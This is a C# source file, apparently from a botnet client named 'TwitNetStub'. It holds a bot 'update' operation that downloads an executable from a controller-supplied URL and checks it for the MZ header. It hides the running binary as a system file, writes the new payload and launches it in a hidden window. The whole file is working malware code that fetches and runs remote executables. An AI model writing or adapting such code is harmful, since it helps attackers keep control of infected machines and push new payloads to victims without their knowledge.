using System;
using System.IO;
using System.Windows.Forms;

namespace TwitNetStub.Operations
{
    class UpdateBotOP : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;

        public UpdateBotOP(string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {

        }
        public void Run()
        {
            MessageBox.Show(MainURL);
            string filename = Constants.FileName;
            byte[] NewBot = new System.Net.WebClient().DownloadData(MainURL);
            if (NewBot[0] != 77 | NewBot[1] != 90) //starts with MZ?
            {
                return;
            }

            if (File.Exists("temp.tmp"))
                File.Delete("temp.tmp");
            File.Move(Application.ExecutablePath, "temp.tmp");
            File.SetAttributes("temp.tmp", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);

            while (!File.Exists("temp.tmp"))
            { Application.DoEvents(); }


            //Download data from the url specified by the user and write it to the file
            File.WriteAllBytes(filename, NewBot);

            //Success! Get out of here and start up the new file
            System.Threading.Thread.Sleep(1000);
            System.Diagnostics.ProcessStartInfo info =
                new System.Diagnostics.ProcessStartInfo(filename)
                    {
                        WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                        UseShellExecute = true
                    };
            System.Diagnostics.Process.Start(info);
            Environment.Exit(-1);
        }
    }
}